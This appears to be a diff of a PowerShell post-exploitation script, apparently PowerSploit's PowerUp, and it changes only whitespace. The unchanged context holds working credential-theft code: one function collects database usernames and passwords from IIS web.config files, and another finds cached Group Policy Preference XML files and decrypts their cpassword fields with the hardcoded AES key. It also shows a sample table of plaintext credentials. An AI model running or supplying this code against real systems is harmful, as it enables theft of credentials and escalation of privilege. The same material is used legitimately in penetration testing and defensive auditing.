@@ -3021,11 +3021,11 @@ function Get-WebConfig {
 
         user    pass       dbserv                vdir               path                          encr
         ----    ----       ------                ----               ----                          ----
-        s1admin s1password 192.168.1.101\server1 C:\App1            C:\App1\web.config            No  
-        s1user  s1password 192.168.1.101\server1 C:\inetpub\wwwroot C:\inetpub\wwwroot\web.config No  
-        s2user  s2password 192.168.1.102\server2 C:\App2            C:\App2\test\web.config       No  
-        s2user  s2password 192.168.1.102\server2 C:\App2            C:\App2\web.config            Yes 
-        s3user  s3password 192.168.1.103\server3 D:\App3            D:\App3\web.config            No 
+        s1admin s1password 192.168.1.101\server1 C:\App1            C:\App1\web.config            No
+        s1user  s1password 192.168.1.101\server1 C:\inetpub\wwwroot C:\inetpub\wwwroot\web.config No
+        s2user  s2password 192.168.1.102\server2 C:\App2            C:\App2\test\web.config       No
+        s2user  s2password 192.168.1.102\server2 C:\App2            C:\App2\web.config            Yes
+        s3user  s3password 192.168.1.103\server3 D:\App3            D:\App3\web.config            No
 
      .LINK
 
@@ -3062,7 +3062,7 @@ function Get-WebConfig {
         $Null = $DataTable.Columns.Add("encr")
 
         # Get list of virtual directories in IIS
-        C:\Windows\System32\InetSRV\appcmd.exe list vdir /text:physicalpath | 
+        C:\Windows\System32\InetSRV\appcmd.exe list vdir /text:physicalpath |
         ForEach-Object {
 
             $CurrentVdir = $_
@@ -3088,7 +3088,7 @@ function Get-WebConfig {
                 if ($ConfigFile.configuration.connectionStrings.add) {
 
                     # Foreach connection string add to data table
-                    $ConfigFile.configuration.connectionStrings.add| 
+                    $ConfigFile.configuration.connectionStrings.add|
                     ForEach-Object {
 
                         [String]$MyConString = $_.connectionString
@@ -3527,7 +3527,7 @@ function Get-CachedGPPPassword {
         License: BSD 3-Clause
         Required Dependencies: None
         Optional Dependencies: None
-     
+
     .DESCRIPTION
 
         Get-CachedGPPPassword searches the local machine for cached for groups.xml, scheduledtasks.xml, services.xml and datasources.xml files and returns plaintext passwords.
@@ -3546,35 +3546,35 @@ function Get-CachedGPPPassword {
                     oups.xml
 
     .LINK
-        
+
         http://www.obscuresecurity.blogspot.com/2012/05/gpp-password-retrieval-with-powershell.html
         https://github.com/mattifestation/PowerSploit/blob/master/Recon/Get-GPPPassword.ps1
         https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/gpp.rb
         http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences
         http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html
 #>
-    
+
     [CmdletBinding()]
     Param()
-    
+
     # Some XML issues between versions
     Set-StrictMode -Version 2
 
     # make sure the appropriate assemblies are loaded
     Add-Type -Assembly System.Security
     Add-Type -Assembly System.Core
-    
+
     # helper that decodes and decrypts password
     function local:Get-DecryptedCpassword {
         [CmdletBinding()]
         Param (
-            [string] $Cpassword 
+            [string] $Cpassword
         )
 
         try {
-            # Append appropriate padding based on string length  
+            # Append appropriate padding based on string length
             $Mod = ($Cpassword.length % 4)
-            
+
             switch ($Mod) {
                 '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
                 '2' {$Cpassword += ('=' * (4 - $Mod))}
@@ -3582,34 +3582,34 @@ function Get-CachedGPPPassword {
             }
 
             $Base64Decoded = [Convert]::FromBase64String($Cpassword)
-            
+
             # Create a new AES .NET Crypto Object
             $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
             [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                                  0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
-            
+
             # Set IV to all nulls to prevent dynamic generation of IV value
-            $AesIV = New-Object Byte[]($AesObject.IV.Length) 
+            $AesIV = New-Object Byte[]($AesObject.IV.Length)
             $AesObject.IV = $AesIV
             $AesObject.Key = $AesKey
-            $DecryptorObject = $AesObject.CreateDecryptor() 
+            $DecryptorObject = $AesObject.CreateDecryptor()
             [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
-            
+
             return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
-        } 
-        
+        }
+
         catch {Write-Error $Error[0]}
-    }  
-    
+    }
+
     # helper that parses fields from the found xml preference files
     function local:Get-GPPInnerFields {
         [CmdletBinding()]
         Param (
-            $File 
+            $File
         )
-    
+
         try {
-            
+
             $Filename = Split-Path $File -Leaf
             [XML] $Xml = Get-Content ($File)
 
@@ -3618,12 +3618,12 @@ function Get-CachedGPPPassword {
             $NewName = @()
             $Changed = @()
             $Password = @()
-    
+
             # check for password field
             if ($Xml.innerxml -like "*cpassword*"){
-            
+
                 Write-Verbose "Potential password in $File"
-                
+
                 switch ($Filename) {
                     'Groups.xml' {
                         $Cpassword += , $Xml | Select-Xml "/Groups/User/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
@@ -3631,13 +3631,13 @@ function Get-CachedGPPPassword {
                         $NewName += , $Xml | Select-Xml "/Groups/User/Properties/@newName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                         $Changed += , $Xml | Select-Xml "/Groups/User/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                     }
-        
-                    'Services.xml' {  
+
+                    'Services.xml' {
                         $Cpassword += , $Xml | Select-Xml "/NTServices/NTService/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                         $UserName += , $Xml | Select-Xml "/NTServices/NTService/Properties/@accountName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                         $Changed += , $Xml | Select-Xml "/NTServices/NTService/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                     }
-        
+
                     'Scheduledtasks.xml' {
                         $Cpassword += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                         $Cpassword += , $Xml | Select-Xml "/ScheduledTasks/TaskV2/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
@@ -3646,27 +3646,27 @@ function Get-CachedGPPPassword {
                         $Changed += , $Xml | Select-Xml "/ScheduledTasks/Task/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                         $Changed += , $Xml | Select-Xml "/ScheduledTasks/TaskV2/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                     }
-        
-                    'DataSources.xml' { 
+
+                    'DataSources.xml' {
                         $Cpassword += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                         $UserName += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
-                        $Changed += , $Xml | Select-Xml "/DataSources/DataSource/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}                          
+                        $Changed += , $Xml | Select-Xml "/DataSources/DataSource/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                     }
-                    
-                    'Printers.xml' { 
+
+                    'Printers.xml' {
                         $Cpassword += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                         $UserName += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                         $Changed += , $Xml | Select-Xml "/Printers/SharedPrinter/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                     }
-  
-                    'Drives.xml' { 
+
+                    'Drives.xml' {
                         $Cpassword += , $Xml | Select-Xml "/Drives/Drive/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                         $UserName += , $Xml | Select-Xml "/Drives/Drive/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
-                        $Changed += , $Xml | Select-Xml "/Drives/Drive/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value} 
+                        $Changed += , $Xml | Select-Xml "/Drives/Drive/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                     }
                 }
            }
-                     
+
            foreach ($Pass in $Cpassword) {
                Write-Verbose "Decrypting $Pass"
                $DecryptedPassword = Get-DecryptedCpassword $Pass
@@ -3674,28 +3674,28 @@ function Get-CachedGPPPassword {
                #append any new passwords to array
                $Password += , $DecryptedPassword
            }
-            
+
             # put [BLANK] in variables
             if (-not $Password) {$Password = '[BLANK]'}
             if (-not $UserName) {$UserName = '[BLANK]'}
             if (-not $Changed)  {$Changed = '[BLANK]'}
             if (-not $NewName)  {$NewName = '[BLANK]'}
-                  
+
             # Create custom object to output results
             $ObjectProperties = @{'Passwords' = $Password;
                                   'UserNames' = $UserName;
                                   'Changed' = $Changed;
                                   'NewName' = $NewName;
                                   'File' = $File}
-                
+
             $ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
             Write-Verbose "The password is between {} and may be more than one value."
-            if ($ResultsObject) {Return $ResultsObject} 
+            if ($ResultsObject) {Return $ResultsObject}
         }
 
         catch {Write-Error $Error[0]}
     }
-    
+
     try {
         $AllUsers = $Env:ALLUSERSPROFILE
 
@@ -3705,7 +3705,7 @@ function Get-CachedGPPPassword {
 
         # discover any locally cached GPP .xml files
         $XMlFiles = Get-ChildItem -Path $AllUsers -Recurse -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml' -Force -ErrorAction SilentlyContinue
-    
+
         if ( -not $XMlFiles ) {
             Write-Verbose 'No preference files found.'
         }
